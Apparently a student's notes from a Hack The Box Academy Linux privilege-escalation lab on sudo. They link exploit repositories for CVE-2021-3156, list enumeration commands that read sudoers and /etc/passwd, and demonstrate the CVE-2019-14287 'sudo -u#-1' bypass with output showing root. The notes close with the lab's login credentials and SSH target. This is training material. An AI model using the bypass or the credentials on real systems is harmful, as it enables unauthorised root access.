# SUDO

- The latest sudo vulnerability is [CVE-2021-3156](https://github.com/worawit/CVE-2021-3156)
- Here is a [Proof-of-Concept](https://github.com/blasty/CVE-2021-3156)

The following will list which users and/or groups are allowed to run which programs with what privileges
``` python
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

Determine sudo version
``` python
sudo -V | head -n1
```

Determine OS Version
```python
cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```

## Sudo Policy Bypass

[CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) This sudo vulnerability affects all versions below 1.8.28 .

The only pre-req for this exploit is the user having to be in the /etc/sudoers file. 

Sudo also allows commands to be executed with a users ID. The users ID can be found in the /etc/passwd file like so. The ID being ==1005==
```python
cat /etc/passwd | grep cry0l1t3

cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

If a negative ID is entered as sudo, this will default to 0, the root user
```python
sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

# Questions

Username
```python
htb-student
```

Password
```python
HTB_@cademy_stdnt!
```

IP
```python
10.129.205.110
```

Hostname
```python
ACADEMY-LLPE-SUDO
```

SSH
```python
ssh htb-student@ACADEMY-LLPE-SUDO
```